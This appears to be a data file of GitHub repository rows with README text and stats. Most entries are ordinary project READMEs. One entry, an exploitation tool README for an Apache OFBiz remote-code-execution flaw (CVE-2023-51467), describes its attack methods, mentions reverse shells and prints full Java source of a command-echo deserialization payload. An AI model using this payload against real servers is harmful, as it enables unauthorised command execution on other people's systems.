 2、自动记账3.0版本中已经加入了对其他记账软件的支持，详情请参考[使用其他记账软件]()



## 📖 文字教程

[点击开始教程](https://auto.ankio.net)


## 📺 视频教程

[点击开始视频教程](https://player.bilibili.com/player.html?aid=289448844&bvid=BV1Hf4y147Yi&cid=303785417&page=1)

## 🛠️ 编译步骤

- 下载源代码到本地

```bash
git clone https://github.com/dreamncn/Qianji_auto
```

- 使用[Android Studio](https://developer.android.com/studio)打开，等待自动配置完成，如出现失败请配置科学上网

- 点击菜单中 `Run` - `Build`

## ⬇️ 下载

- [酷安](https://www.coolapk.com/apk/cn.dreamn.qianji_auto)
- [LSPosed仓库](https://github.com/Xposed-Modules-Repo/cn.dreamn.qianji_auto/releases/tag/v3.2.4)


## 📝 License

Copyright © 2022 [Ankio](https://www.ankio.net).<br />
This project is [GPL3.0](https://github.com/dreamncn/Qianji_auto/blob/master/LICENSE) licensed.




 
",0,5,4,
agents-flex/agents-flex,main,,4,3,1,Apache-2.0
TFyre/bambu-farm,main,"# Cannot print with latest firmware
> [!IMPORTANT]  
> https://wiki.bambulab.com/en/p1/manual/p1p-firmware-release-history
>
> Bambulab decided to block printing via MQTT unless you enable lanmode only.
>
> Consider downgrading firmware Reference [!142](https://github.com/TFyre/bambu-farm/issues/142)
>
> **OR**
>
> Check the [Cloud Section](#cloud-section) about enabling cloud mode


# Bambu Farm
[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/tfyre)


Web based application to monitor multiple bambu printers using mqtt / ftp / rtsp (**no custom firmware required**)

Technologies used:
* Java 21 https://www.azul.com/
* Quarkus https://quarkus.io/
* Vaadin https://vaadin.com/

# Features / Supported Devices

| Feature | A1 | A1 Mini | P1P | P1S | X1C|
|--|:--:|:--:|:--:|:--:|:--:|
|**Remote View**|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] <sup>3</sup></li></ul>|
|**Upload to SD card**|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] <sup>2</sup></li></ul>|
|**Print .3mf from SD card**<sup>1</sup>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] <sup>2</sup></li></ul>|
|**Print .gcode from SD card**|?|?|?|?|?|
|**Batch Printing**<sup>4</sup>|?|?|?|<ul><li>[x] </li></ul>|<ul><li>[x] <sup>2</sup></li></ul>|
|**AMS**|?|?|?|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|
|**Send Custom GCode**|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|<ul><li>[x] </li></ul>|

1. **Currently only .3mf sliced projects are supported.**
  > In Bambu Studio/Orca slicer, make sure to slice the place and then use the ""File -> Export -> Export plate sliced file"". This creates a `.3mf` project with embedded `.gcode` plate.
2. **FTPS Connections needs SSL Session Reuse via [Bouncy Castle](#bouncy-castle)**
> Without enabling bouncy castle, you will see `552 SSL connection failed: session resuse required`
3. Getting the **LiveView** to work requires additional software. For more details check the [docker/bambu-liveview](docker/bambu-liveview) README.
4. **Batch Priting** allows you to upload a single/multi sliced .3mf and select which plate to send to multiple printers, each with their own filament mapping.

# Screenshots

* Dashboard
![Desktop browser](/docs/bambufarm1.jpg)
* Batch printing
![Batch Printing](/docs/batchprint.png)

*More screenshots in [docs](/docs)*

# I just want to run it

* Make sure you have Java 21 installed, verify with `java -version`
```bash
[user@build:~]# java -version
openjdk version ""21.0.1"" 2023-10-17 LTS
OpenJDK Runtime Environment Zulu21.30+15-CA (build 21.0.1+12-LTS)
OpenJDK 64-Bit Server VM Zulu21.30+15-CA (build 21.0.1+12-LTS, mixed mode, sharing)
```
* Download the latest `bambu-web-*-runner.jar` from [releases](https://github.com/TFyre/bambu-farm/releases/latest) into a new folder (or use the 1 liner below):
```bash
curl -s https://api.github.com/repos/tfyre/bambu-farm/releases/latest \
  | grep browser_download_url | cut -d'""' -f4 | xargs curl -LO
```
* Create a `.env` config file from [Minimal Config](#minimal-config)
  * *Check out the [Full Config Options](#full-config-options) section if you want to tweak some settings*
* Run with `java -jar bambu-web-x.x.x-runner.jar`
```bash
[user@build:~]# java -jar bambu-web-1.0.1-runner.jar
__  ____  __  _____   ___  __ ____  ______
 --/ __ \/ / / / _ | / _ \/ //_/ / / / __/
 -/ /_/ / /_/ / __ |/ , _/ ,< / /_/ /\ \
--\___\_\____/_/ |_/_/|_/_/|_|\____/___/
2024-01-23 08:49:05,586 INFO  [io.und.servlet] (main) Initializing AtmosphereFramework
...
...
2024-01-23 08:49:05,666 INFO  [com.vaa.flo.ser.DefaultDeploymentConfiguration] (main) Vaadin is running in production mode.
2024-01-23 08:49:05,912 INFO  [org.apa.cam.qua.cor.CamelBootstrapRecorder] (main) Bootstrap runtime: org.apache.camel.quarkus.main.CamelMainRuntime
2024-01-23 08:49:05,913 INFO  [org.apa.cam.mai.MainSupport] (main) Apache Camel (Main) 4.2.0 is starting
...
...
2024-01-23 08:49:06,029 INFO  [com.tfy.bam.cam.CamelController] (main) configured
2024-01-23 08:49:06,074 INFO  [org.apa.cam.imp.eng.AbstractCamelContext] (main) Apache Camel 4.2.0 (camel-1) is starting
2024-01-23 08:49:06,081 INFO  [org.apa.cam.imp.eng.AbstractCamelContext] (main) Routes startup (total:10 started:0 disabled:10)
...
...
2024-01-23 08:49:06,085 INFO  [org.apa.cam.imp.eng.AbstractCamelContext] (main) Apache Camel 4.2.0 (camel-1) started in 10ms (build:0ms init:0ms start:10ms)
2024-01-23 08:49:06,193 INFO  [io.quarkus] (main) bambu-web 1.0.1 on JVM (powered by Quarkus 3.6.6) started in 1.421s. Listening on: http://0.0.0.0:8084
2024-01-23 08:49:06,194 INFO  [io.quarkus] (main) Profile prod activated.
2024-01-23 08:49:06,194 INFO  [io.quarkus] (main) Installed features: [camel-core, camel-direct, camel-paho, cdi, resteasy-reactive, resteasy-reactive-jackson, 
scheduler, security, servlet, smallrye-context-propagation, vaadin-quarkus, vertx, websockets, websockets-client]
```
* If starting correctly, it will show `Routes startup (total:10 started:0 disabled:10)` with a number that is 2x your printer count
* Head over to http://127.0.0.1:8080 and log in with `admin` / `admin`

# Building & Running

Building:
```bash
mvn clean install -Pproduction
```

Create a new directory and copy `bambu/target/bambu-web-1.0.0-runner.jar` into it, example:
```bash
tfyre@fsteyn-pc:/mnt/c/bambu-farm$ ls -al
total 64264
drwxrwxrwx 1 tfyre tfyre     4096 Jan 17 16:47 .
drwxrwxrwx 1 tfyre tfyre     4096 Jan 18 20:42 ..
-rw-rw-rw- 1 tfyre tfyre     4557 Jan 18 14:01 .env
-rw-rw-rw- 1 tfyre tfyre 65796193 Jan 18 20:38 bambu-web-1.0.0-runner.jar
```

Running
```bash
java -jar bambu-web-1.0.0-runner.jar
```

You can now access it via http://127.0.0.1:8080 (username: admin / password: admin)

# Running as a service

Refer to [README.service.md](/docs/README.service.md)

# Example Config

## Minimal config

**!!Remeber to replace `REPLACE_*` fields!!**

Create an `.env` file with  the following config:
```properties
quarkus.http.host=0.0.0.0
quarkus.http.port=8080

bambu.printers.myprinter1.device-id=REPLACE_WITH_DEVICE_SERIAL
bambu.printers.myprinter1.access-code=REPLACE_WITH_DEVICE_ACCESSCODE
bambu.printers.myprinter1.ip=REPLACE_WITH_DEVICE_IP

bambu.users.admin.password=admin
bambu.users.admin.role=admin
```

## Full Config Options

**All default options are displayed (only add to the config if you want to change)**

### Dark Mode
```properties
# Gobal
bambu.dark-mode=false
# Per user (will default to global if omitted)
bambu.users.myUserName.dark-mode=false
```

### Printer section
```properties
bambu.printers.myprinter1.enabled=true
bambu.printers.myprinter1.name=Name With Spaces
bambu.printers.myprinter1.device-id=REPLACE_WITH_DEVICE_SERIAL
bambu.printers.myprinter1.username=bblp
bambu.printers.myprinter1.access-code=REPLACE_WITH_DEVICE_ACCESSCODE
bambu.printers.myprinter1.ip=REPLACE_WITH_DEVICE_IP
bambu.printers.myprinter1.use-ams=true
bambu.printers.myprinter1.timelapse=true
bambu.printers.myprinter1.bed-levelling=true
bambu.printers.myprinter1.flow-calibration=true
bambu.printers.myprinter1.vibration-calibration=true
bambu.printers.myprinter1.model=unknown / a1 / a1mini / p1p / p1s / x1c
bambu.printers.myprinter1.mqtt.port=8883
bambu.printers.myprinter1.mqtt.url=ssl://${bambu.printers.myprinter1.ip}:${bambu.printers.myprinter1.mqtt.port}
bambu.printers.myprinter1.mqtt.report-topic=device/${bambu.printers.myprinter1.device-id}/report
bambu.printers.myprinter1.mqtt.request-topic=device/${bambu.printers.myprinter1.device-id}/request
#Requesting full status interval
bambu.printers.myprinter1.mqtt.full-status=10m
bambu.printers.myprinter1.ftp.port=990
bambu.printers.myprinter1.ftp.url=ftps://${bambu.printers.myprinter1.ip}:${bambu.printers.myprinter1.ftp.port}
bambu.printers.myprinter1.ftp.log-commands=false
bambu.printers.myprinter1.stream.port=6000
bambu.printers.myprinter1.stream.live-view=false
bambu.printers.myprinter1.stream.url=ssl://${bambu.printers.myprinter1.ip}:${bambu.printers.myprinter1.stream.port}
#Restart stream if no images received interval
bambu.printers.myprinter1.stream.watch-dog=5m
```

### Cloud Section

Enable MQTT connection via cloud instead of directly to printer. You can either provide the username/password or a access token.

* Option 1 - username/password

Provide the username and password for https://bambulab.com/ in the format below

* Option 2 - access token

The access token can be fetched from your browser cookies or a 1 liner curl
```bash
curl -v -X POST -H 'Content-Type: application/json' -d '{""account"":""YOUR_USER_NAME"",""password"":""YOUR_PASSWORD""}' https://bambulab.com/api/sign-in/form 2>&1 | grep token= | awk '{print$3}'
```

Configuration:

```properties
bambu.cloud.enabled=true

# Option1: Let bambufarm login and fetch token
bambu.cloud.login.username=YOUR_LOGIN_USER
bambu.cloud.login.password=YOUR_LOGIN_PASSWORD

# Option2: fetch token via curl and paste here
bambu.cloud.token=FULL_JWT_TOKEN_FROM_COOKIES
```

### User Section

**Remember to encrypt your passwords with bcrypt (eg https://bcrypt-generator.com/)**

Current roles supported:

* `admin` - full access
* `normal` - only dashboard with readonly access

```properties
# https://bcrypt-generator.com/
#bambu.users.REPLACE_WITH_USERNAME.password=REPLACE_WITH_PASSWORD

# Insecure version:
#bambu.users.myUserName.password=myPassword
# Secure version:
bambu.users.myUserName.password=$2a$12$GtP15HEGIhqNdeKh2tFguOAg92B3cPdCh91rj7hklM7aSOuTMh1DC 
bambu.users.myUserName.role=admin
bambu.users.myUserName.dark-mode=false

#Guest account with readonly role
bambu.users.guest.password=guest
bambu.users.guest.role=normal

# Skip users and automatically login as admin (default: false)
bambu.auto-login=true
```

### Preheat

Default preheat configuration is below:
```properties
bambu.preheat[0].name=Off 0/0
bambu.preheat[0].bed=0
bambu.preheat[0].nozzle=0
bambu.preheat[1].name=PLA 55/220
bambu.preheat[1].bed=55
bambu.preheat[1].nozzle=220
bambu.preheat[2].name=ABS 90/270
bambu.preheat[2].bed=90
bambu.preheat[2].nozzle=270
```

### Remote View

Remote View is the ability to remotely view or stream the printer's camera.

```properties
# defaults to true, when false, disables remote view globally
bambu.remote-view=true

# defaults to true, when false, disables remote view for dashboard, but will still be available in detail view
bambu.dashboard.remote-view=true

# defaults to true, when false, disables per printer
bambu.printers.myprinter1.stream.enable=true
```


### Live View

Live View is the ability to remotely stream the X1C camera (or any other webcam) and requires Remote View to be enabled.

> [!NOTE]
> Getting the **LiveView** to work requires additional software. For more details check the [docker/bambu-liveview](docker/bambu-liveview) README.


```properties
bambu.live-view-url=/_camerastream/

# For each printer:
bambu.printers.PRINTER_ID.stream.live-view=true

# Default LiveView URL
bambu.printers.PRINTER_ID.stream.url=${bambu.live-view-url}${PRINTER_ID}

# Custom LiveView URL
bambu.printers.PRINTER_ID.stream.url=https://my_stream_domain.com/mystream
# 
```


### Bouncy Castle
`X1C` needs SSL Session Reuse so that SD Card functionality can work. Reference: https://stackoverflow.com/a/77587106/23289205

Without this you will see `552 SSL connection failed: session resuse required`.

Add to `.env`:
```properties
bambu.use-bouncy-castle=true
```
Add JVM startup flag:

bash / cmd:
```bash
java -Djdk.tls.useExtendedMasterSecret=false -jar bambu-web-x.x.x-runner.jar
```

powershell:
```powershell
java ""-Djdk.tls.useExtendedMasterSecret=false"" -jar bambu-web-x.x.x-runner.jar
```

### Uploading bigger files

Add to `.env`:
```properties
quarkus.http.limits.max-body-size=30M
```

### Configure XY/Z movement speeds

Add to `.env`:
```properties
# values are in mm/minute
bambu.move-xy=5000
bambu.move-z=3000
```

### Use Right click for menus

Add to `.env`:
```properties
bambu.menu-left-click=false
```

### Custom CSS

If you want to modify the CSS, create a file next to the `.jar` file called `styles.css`

* Changing the display columns

*Display columns is a ratio and scale based on screen width*

Refer to [bambu.css](/bambu/frontend/themes/bambu-theme/bambu.css#L1-L25)

| Example | value for XXX |
| -- | -- |
| always 1 column | 1 |
| 2 columns with 1080p | 3 |
| 4 columns with 1080p | 5 |

```css
:root {
  --bambu-default-columns: XXX;
}
```

# Debug

For debugging the application, add the following to .env and uncomment DEBUG or TRACE logging sections

```properties
### Log To File
quarkus.log.file.enable=true
quarkus.log.file.path=application.log


### DEBUG logging
#quarkus.log.category.""com.tfyre"".level=DEBUG


### TRACE logging
#quarkus.log.min-level=TRACE
#quarkus.log.category.""com.tfyre"".min-level=TRACE
#quarkus.log.category.""com.tfyre"".level=TRACE
```

# Links

## Inspirational Web interface

* https://github.com/davglass/bambu-farm/tree/main

## Printer MQTT Interface

* https://github.com/Doridian/OpenBambuAPI/blob/main/mqtt.md
* https://github.com/xperiments-in/xtouch/blob/main/src/xtouch/device.h
* https://github.com/SoftFever/OrcaSlicer/blob/main/src/slic3r/GUI/DeviceManager.hpp

## Remoteview

* https://github.com/bambulab/BambuStudio/issues/1536#issuecomment-1811916472


## Images from

* https://github.com/SoftFever/OrcaSlicer/tree/main/resources/images

## Json to Proto

* https://json-to-proto.github.io/
* https://formatter.org/protobuf-formatter
",14,28,4,Apache-2.0
sidduganeshsid/Core-Java,main,"# Core Java Codes
<!--<iframe width=""600"" height=""400"" frameBorder=""0"" src=""https://www.mindmeister.com/maps/public_map_shell/3067400300/core-java-java-se-made-by-sidduganesh?width=600&height=400&z=auto&no_share=1&no_logo=1"" scrolling=""no"" style=""overflow:hidden;margin-bottom:5px"">Your browser is not able to display frames. -->Please visit <a href=""https://www.mindmeister.com/3067400300/core-java-java-se-made-by-sidduganesh"" target=""_blank"">Core Java (Java SE) made by sidduganesh</a> on MindMeister.
",0,0,2,
JaneMandy/CVE-2023-51467-Exploit,main,"# CVE-2023-51467
图形化 Apache Ofbiz CVE-2023-51467 远程代码执行漏洞利用工具

为了把问题降到最低，避免乱码问题使用全局英文。

来自思极的科技

## 使用问题
该利用工具使用修改过的反序列化直接将命令执行结果进行base64并且返回，命令执行也是同样返回思路，但是ofbiz有个问题就是println输出不了，这里通过错误提醒方式提取命令执行结果。

本工具直接使用，开发者研究的回显方式。可能较低版本有无法利用情况，请注意回显结果。

如果遇到这种问题，请选择Set Host Header 
![img.png](image%2Fimg.png)

## 功能介绍
### 反序列化打法
基于CommonsBeanutils1链和TomcatCmdEcho进行利用。如果出现了

The vulnerability exists but the exploitation fails. You need to jump to the deserialization exploit chain, which may lead to unauthorized access.

可以尝试使用ysoserial生成别的链进行利用。
![img.png](image/deskimg.png)


### 命令执行打法
通过Groovy脚本进行命令执行，但是println是无法直接回显，可以直接进行反弹shell。本工具支持命令执行回显，通过List products = delegator.findList方式触发异常并且从中捕获执行结果。
![img.png](image/comimg.png)

## 关于反序列化数据
反序列化数据使用hktalent大佬的ysoserial-y4er里面集成的TomcatCmdEcho，并且将内部进行拓展从而实现利用。

```Java
package ysoserial.payloads.templates;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import com.sun.syndication.io.impl.Base64;

public class TomcatCmdEcho extends AbstractTranslet {

    static {
        try {
            boolean flag = false;
            ThreadGroup group = Thread.currentThread().getThreadGroup();
            java.lang.reflect.Field f = group.getClass().getDeclaredField(""threads"");
            f.setAccessible(true);
            Thread[] threads = (Thread[]) f.get(group);
            for (int i = 0; i < threads.length; i++) {
                try {
                    Thread t = threads[i];
                    if (t == null) continue;
                    String str = t.getName();
                    if (str.contains(""exec"") || !str.contains(""http"")) continue;
                    f = t.getClass().getDeclaredField(""target"");
                    f.setAccessible(true);
                    Object obj = f.get(t);
                    if (!(obj instanceof Runnable)) continue;
                    f = obj.getClass().getDeclaredField(""this$0"");
                    f.setAccessible(true);
                    obj = f.get(obj);
                    try {
                        f = obj.getClass().getDeclaredField(""handler"");
                    } catch (NoSuchFieldException e) {
                        f = obj.getClass().getSuperclass().getSuperclass().getDeclaredField(""handler"");
                    }
                    f.setAccessible(true);
                    obj = f.get(obj);
                    try {
                        f = obj.getClass().getSuperclass().getDeclaredField(""global"");
                    } catch (NoSuchFieldException e) {
                        f = obj.getClass().getDeclaredField(""global"");
                    }
                    f.setAccessible(true);
                    obj = f.get(obj);
                    f = obj.getClass().getDeclaredField(""processors"");
                    f.setAccessible(true);
                    java.util.List processors = (java.util.List) (f.get(obj));
                    for (int j = 0; j < processors.size(); ++j) {
                        Object processor = processors.get(j);
                        f = processor.getClass().getDeclaredField(""req"");
                        f.setAccessible(true);
                        Object req = f.get(processor);
                        Object resp = req.getClass().getMethod(""getResponse"", new Class[0]).invoke(req);
                        str = (String) req.getClass().getMethod(""getHeader"", new Class[]{String.class}).invoke(req, new Object[]{""cmd""});
                        if (str != null && !str.isEmpty()) {
                            resp.getClass().getMethod(""setStatus"", new Class[]{int.class}).invoke(resp, new Integer(200));
                            String[] cmds = System.getProperty(""os.name"").toLowerCase().contains(""win"") ? new String[]{""cmd.exe"", ""/c"", str} : new String[]{""/bin/bash"", ""-c"", str};
                            byte[] result = base64Encode(((new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter(""\\A"").next()).getBytes()).getBytes();
                           
                            try {
                                Class cls = Class.forName(""org.apache.tomcat.util.buf.ByteChunk"");
                                obj = cls.newInstance();
                                cls.getDeclaredMethod(""setBytes"", new Class[]{byte[].class, int.class, int.class}).invoke(obj, result, new Integer(0), new Integer(result.length));
                                resp.getClass().getMethod(""doWrite"", new Class[]{cls}).invoke(resp, obj);
                            } catch (NoSuchMethodException var5) {
                                Class cls = Class.forName(""java.nio.ByteBuffer"");
                                obj = cls.getDeclaredMethod(""wrap"", new Class[]{byte[].class}).invoke(cls, new Object[]{result});
                                resp.getClass().getMethod(""doWrite"", new Class[]{cls}).invoke(resp, obj);
                            }
                            flag = true;
                        }
                        if (flag) break;
                    }
                    if (flag) break;
                } catch (Exception e) {
                    continue;
                }
            }

        } catch (Exception e) {
        }
    }
    public static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName(""java.util.Base64"");
            Object Encoder = base64.getMethod(""getEncoder"", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod(""encodeToString"", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName(""sun.misc.BASE64Encoder"");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod(""encode"", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return ""<command_result>""+value+""</command_result>"";
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

```",1,0,1,
wuchubuzai2018/lantu-pay-sdk,master,"# 蓝兔支付SDK：lantu-pay-sdk

# 一、项目介绍

支持个人用户签约使用的蓝兔支付平台的Java SDK项目。API接口来源：https://www.ltzf.cn/doc

我的邀请注册链接：https://www.ltzf.cn/?invite=owbryg

蓝兔支付申请教程：https://juejin.cn/post/7312273015873732649

# 二、项目内容

针对支持个人签约的蓝兔支付平台的提供的Java SDK工具包，SDK设计思想可以参考开源项目wxjava中相关的类设计，抽取了其中的核心设计。通过这个项目你可以学习到：

1、统一抽象的HTTP请求框架的设计与实现

2、多个模板方法模式、策略模式、建造者设计与实现

3、请求三方时的@Require注解校验设计与实现

4、错误重试的设计与实现

5、泛型的设计与实现

6、请求参数的签名的设计与实现

# 三、工程结构

docs：工程的相关文档

SDK支付的Demo工程：lantu-sdk-demo

SDK的JAVA工程：lantu-sdk-java

Spring Boot Starter工程：lantu-sdk-spring-boot-starter


# 四、功能列表

1、目前正在develop分支进行开发，定期合并到主分支

2、开发进度如下：

- 20231218：开发Starter：Lantu SDK Spring Starter
- 20231229：开发HTTP请求框架：HTTP请求框架与存储层配置
- 20231231：开发PC端二维码下单接口：PC下单支付请求流程
- 20240102：开发订单退款接口：订单退款API
- 20240103：开发订单查询接口：订单查询API

3、目前实现功能如下：

- PC端扫码支付API(LantuWxPayNativeOrderRequest)
- 订单退款API(LantuWxPayRefundOrderRequest)
- 订单查询API(LantuWxPayQueryOrderRequest)
- 查询微信授权连接API(LantuWxPayGetWechatOpenIdRequest)

# 五、使用步骤

1、在业务项目工程中，引入maven依赖，目前需要手动导入，后续会上传到maven仓库:

```
<dependency>
    <groupId>cn.ltzf</groupId>
    <artifactId>lantu-sdk-spring-boot-starter</artifactId>
    <version>1.0-SNAPSHOT</version>
</dependency>
```

2、在配置文件中，配置需要的商户号、回调地址、秘钥等信息：

```
ltzf:
  wx:
    mch-id: """"
    secret-key: """"
    notify-url: """"
```

3、在业务代码中，注入Service类，并定义PC端下单生成接口：

```java
@RestController
@RequestMapping(""/demo"")
public class DemoController {
    
    /**
    * 注入蓝兔支付Service
    */
    @Autowired
    private LantuWxPayService lantuWxPayService;
    
    /**
     * 测试蓝兔支付 PC端扫描请求
     *
     * @return
     */
    @GetMapping(""/native"")
    public LantuWxPayNativeOrderResult nativeOrder() {
        // 定义蓝兔支付二维码生成请求
        LantuWxPayNativeOrderRequest request = new LantuWxPayNativeOrderRequest();
        String tradeNo = ""2023"" + System.currentTimeMillis();
        request.setOutTradeNo(tradeNo);
        request.setTotalFee(""0.01"");
        request.setBody(""测试商品"");
        LantuWxPayNativeOrderResult result = lantuWxPayService.createNativeOrder(request);
        return result;
    }
    
}
```

# 六、参与贡献

1、工程中采用checkstyle.xml文件作为代码风格的统一与质量检测，在开发时需要导入项目中的该文件进行检测，需要使用maven的validate进行参数的校验

2、fork当前仓库到自己的仓库，然后在develop分支上进行开发，然后提交PR

3、加入知识星球，与作者沟通交流自己的想法


# 七、知识星球

知识星球：觉醒的新世界程序员
",0,0,2,
Trendyol/kafkathena-jakarta,master,"<div id=""top""></div>
<p align=""center"">
<img src=""docs/images/kafkathena_logo.png"" width=""250"" alt=""Kafkathena""/>
</p>

<h1 align=""center"">Smart, Fast, Customizable Consumer Configurations</h1>

<p align=""center"">
<a href=""https://github.com/Trendyol/kafkathena-commons/blob/next/LICENSE"">
    <img src=""https://img.shields.io/github/v/release/Trendyol/kafkathena-commons"" alt=""Release"" />
  </a>
<a href=""https://img.shields.io/badge/spring%20boot-2.x%7C3.x-orange"">
    <img src=""https://img.shields.io/badge/spring%20boot-2.x%7C3.x-orange"" alt=""License"" />
  </a>
  <a href=""https://github.com/Trendyol/kafkathena-commons/blob/next/LICENSE"">
    <img src=""https://img.shields.io/github/license/trendyol/baklava"" alt=""Spring Boot Version"" />
  </a>
</p>

<!-- ABOUT THE PROJECT -->
## About The Project

There are many great kafka configurations libraries; however, we didn't find one that really suited our needs so we created this enhanced one. Kafkathena provided by [Trendyol](https://github.com/trendyol)

Here's why:
* Your time should be focused on creating only consumer business. This library that solves a kafka configuration time complexity on your projects.
* Add as dependency, create consumer/producer configs, create consumer class and go!

<p align=""right"">(<a href=""#top"">back to top</a>)</p>

<!-- Features -->
## Features

* Config as a consumer and producers
* Consumer Acknowledge Customize Support
* Multiple Kafka Cluster Support
* Failover Error Topic and Custom Class Implementation
* Fixed Retry and Exponential Retry Support
* Consumer base ignore exceptions in failover
* Single Error Topic With Multiple Consumers
* Single Error Topic With Header Key Listening
* Filtered Consume Message
* Seperated Consume and Error Cluster
* Avro/Protobuffer Deserializer Support
* Authentication Base Cluster Support
* Kafka Message Sender Utility
* Spring 2.x/3.x, JDK 11/17 Support

<p align=""right"">(<a href=""#top"">back to top</a>)</p>

<!-- Build With -->
### Built With

This section should list any major frameworks/libraries used to bootstrap your project. Leave any add-ons/plugins for the acknowledgements section. Here are a few examples.

* [Spring Starter 3+]
* [Spring Kafka Starter]
* [Jdk 17]

<p align=""right"">(<a href=""#top"">back to top</a>)</p>

<!-- GETTING STARTED -->
## Getting Started

This is an example of how you may give instructions on setting up your project locally.
To get a local copy up and running follow these simple example steps.

### Prerequisites

This is an example of how to list things you need to use the software and how to install them.
* Maven 3+
* Jdk 17

### Installation
1. Copy and paste this inside your pom.xml dependencies block.
```xml
<dependency>
  <groupId>com.trendyol</groupId>
  <artifactId>kafkathena-jakarta</artifactId>
  <version>RELEASE</version>
</dependency>
```

<p align=""right"">(<a href=""#top"">back to top</a>)</p>

<!-- USAGE EXAMPLES -->
## Usage

1. Add kafkathena
1. Add $`\textcolor{red}{\text{@EnableKafkathena}}`$ annotation as a configuration on SpringBoot Application
2. Create kafkathena config.yml

```
kafkathena:
  shared-factory-props:
    producer:
      interceptor: ""com.trendyol.mpc.kafkathena.commons.interceptor.KSProducerInterceptor""
    consumer:
      interceptor: ""com.trendyol.mpc.kafkathena.commons.interceptor.KSConsumerInterceptor""
      autoStartup: true
      missingTopicAlertEnable: false
      concurrency: 1
      syncCommitTimeoutSecond: 5
      syncCommit: true
      batch: false
      ackMode: RECORD
    clusters:
      ""[confluent]"":
        servers: localhost:9092
    
  producers:
    default:
      cluster: confluent
      props:
        ""[batch.size]"": 16384
        ""[linger.ms]"": 0
        ""[buffer.memory]"": 33554432
        ""[key.serializer]"": org.apache.kafka.common.serialization.StringSerializer
        ""[value.serializer]"": org.springframework.kafka.support.serializer.JsonSerializer
        ""[acks]"": ""1""
        ""[request.timeout.ms]"": 30000
  consumers:
    ""[consumer-one]"":
      type: JSON # AVRO/PROTO/JSON it can be empty
      topic: kafkathena.topic.one
      factory-bean-name: consumerOneKafkaListenerContainerFactory
      data-class: com.trendyol.kafkathena.demo.model.ConsumerOneMessage
      error-producer-name: default
      cluster: confluent
      filter-header:
        error-producer-filter-key: one-filter
        consumer-filter-key: one-filter
      failover:
        error-topic: kafkathena.topic.error
        handler-bean-name: defaultConsumerFailoverHandler
      fixed-retry:
        retry-count: 1
        backoff-interval-millis: : 5000 #wait time for retry
      exponential-retry:
        retry-count: : 1
        multiplier: 2
        maxInterval: 5
        backoff-interval-millis: : 1000
      factory-props:
        auto-startup: : true
        missing-topic-alert-enable: : false
        concurrency: 1
        sync-commit-timeout-second: : 5
        sync-commit: : true
        ack-mode: : RECORD
        interceptor-class-path: : com.trendyol.kafkathena.demo.interceptor.KafkaConsumerInterceptor
      props:
        ""[group.id]"": kafkathena.topicOneGroup
        ""[value.deserializer]"": org.springframework.kafka.support.serializer.ErrorHandlingDeserializer
        ""[spring.deserializer.value.delegate.class]"": org.springframework.kafka.support.serializer.JsonDeserializer
        ""[key.deserializer]"": org.springframework.kafka.support.serializer.ErrorHandlingDeserializer
        ""[spring.deserializer.key.delegate.class]"": org.apache.kafka.common.serialization.StringDeserializer
        ""[max.poll.records]"": 100
        ""[max.poll.interval.ms]"": 300000
        ""[session.timeout.ms]"": 300000
        ""[heartbeat.interval.ms]"": 3000
        ""[enable.auto.commit]"": true
        ""[auto.offset.reset]"": earliest
        ""[fetch.max.bytes]"": 52428800
        ""[fetch.max.wait.ms]"": 500
```
```
@Component
@DependsOnKafkathena
public class ConsumerOne {

    @KafkaListener(
            topics = ""${kafkathena.consumers[consumer-one].topic}"",
            groupId = ""${kafkathena.consumers[consumer-one].props[group.id]}"",
            containerFactory = ""${kafkathena.consumers[consumer-one].factory-bean-name}""
    )
    public void consume(@Payload ConsumerOneMessage message) {

    }
}
```

<p align=""right"">(<a href=""#top"">back to top</a>)</p>

",1,0,1,MIT
fangyi1008/pri_cloud,main,"# pri_cloud
私有云管平台

有兴趣完善该服务的可以加qq群：667403870


需要安装noVNC
./run --web /fyCloud/vm/vnc/noVNC-master --cert self.pem --token-plugin TokenFile --token-source /fyCloud/vm/vnc/noVNC-master/utils/websockify/token/ 6080
",0,0,1,Apache-2.0
dantmnf/NoSwipeToKill,master,,1,2,1,
Rapter1990/parkinglot,main,"# Case Study - Parking Lot

<p align=""center"">
    <img src=""screenshots/parking_lot_main_image.png"" alt=""Main Information"" width=""850"" height=""600"">
</p>

### 📖 Information

<ul style=""list-style-type:disc"">
  <li><b>Parking Lot</b> is a <b>Spring Boot application</b> covering important and useful features related to managing parking areas, park check-ins and check-outs for drivers, user management, and vehicle management.</li> 
  <li>
    <b>Roles:</b>
    <ul>
      <li><b>Admin:</b> Users with administrative privileges.</li>
      <li><b>Driver:</b> Users with driver privileges.</li>
    </ul>
    <b>Explanation:</b>
    <ul>
      <li><b>AuthController:</b> API for authentication operations such as register, login, refresh token, and logout.</li>
      <li><b>ParkController:</b> APIs related to park check-ins and check-outs for <b>drivers</b>.</li>
      <li><b>ParkingAreaController:</b> APIs for managing parking areas, including creating, updating, and deleting parking areas, as well as retrieving parking area information and daily income handled with <b>admins</b></li>
